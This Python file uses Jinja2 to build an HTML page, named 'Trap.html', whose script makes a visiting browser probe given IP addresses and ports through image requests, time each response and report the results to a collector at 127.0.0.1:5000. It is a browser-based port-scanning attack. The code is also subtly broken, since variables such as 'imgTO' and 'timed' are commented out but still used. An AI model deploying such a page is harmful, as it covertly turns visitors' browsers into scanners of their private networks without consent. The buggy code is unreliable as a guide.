from IPython.display import HTML
from jinja2 import Template
from jinja2 import Environment, PackageLoader


def create_html(lips,lports,payload='/',filename='Trap.html'):
    js_header_t="""$(function() {
    var timed = false;
    //var imgTO = setTimeout(function () {
    //    timed = true;
    //    alert("timed out");
    //}, 20000);  // 2 second timeout
    
    var sendDate = (new Date()).getTime();
    """
    loop_ip_t="""
    //var sendDate = (new Date()).getTime();
    {% for ip in lips %}
      {% for port in lports %}
        {% block loop_item scoped %}
          var d = new Date();
          var t = d.getTime();

          $("<img>").on({
           error: function() {
            var receiveDate = (new Date()).getTime();

            var responseTimeMs = receiveDate - sendDate;
            $("<img>").attr("src", "http://127.0.0.1:5000/ips/{{ip.replace('.','o')}}x{{port}}x"+responseTimeMs);
            
           },
           load: function() {
            clearTimeout(imgTO);
            if (!timed) alert("open");
            $("<img>").attr("src", "http://127.0.0.1:5000/ips/{{ip.replace('.','o')}}x{{port}}x"+responseTimeMs+"ok");
            }
          }).attr("src", "http://{{ip}}:{{port}}{{payload}}");
        {% endblock %}
      {% endfor %}
    {% endfor %}
    });"""
    html="<html><head><script>"+js_header_t+loop_ip_t+"</script></head>"
    template = Template(html)
    return template.stream(lips=lips,lports=lports,payload=payload).dump(filename)

def scan_resources(lips,ports,payload='/'):    
    js_header_t="""$(function() {
    //var timed = false;
    //var imgTO = setTimeout(function () {
    //    timed = true;
    //    alert("timed out");
    //}, 20000);  // 2 second timeout
    
    var sendDate = (new Date()).getTime();
    """
    loop_ip_t="""
    //var sendDate = (new Date()).getTime();
    {% for ip in lips %}
      {% for port in lports %}
        {% block loop_item scoped %}
          var d = new Date();
          var t = d.getTime();

          $("<img>").on({
           error: function() {
            var receiveDate = (new Date()).getTime();

            var responseTimeMs = receiveDate - sendDate;
            $("<img>").attr("src", "http://127.0.0.1:5000/ips/{{ip.replace('.','o')}}x{{port}}x"+responseTimeMs);
            
           },
           load: function() {
            clearTimeout(imgTO);
            if (!timed) alert("open");
            $("<img>").attr("src", "http://127.0.0.1:5000/ips/{{ip.replace('.','o')}}x{{port}}x"+responseTimeMs+"ok");
            }
          }).attr("src", "http://{{ip}}:{{port}}{{payload}}");
        {% endblock %}
      {% endfor %}
    {% endfor %}
    });"""
    html="<html><head><script>"+js_header_t+loop_ip_t+"</script></head>"
    template = Template(html)
    #tag=encode_tag(ip,port)  
    return  HTML(template.render(lips=lips,lports=ports,payload=payload))    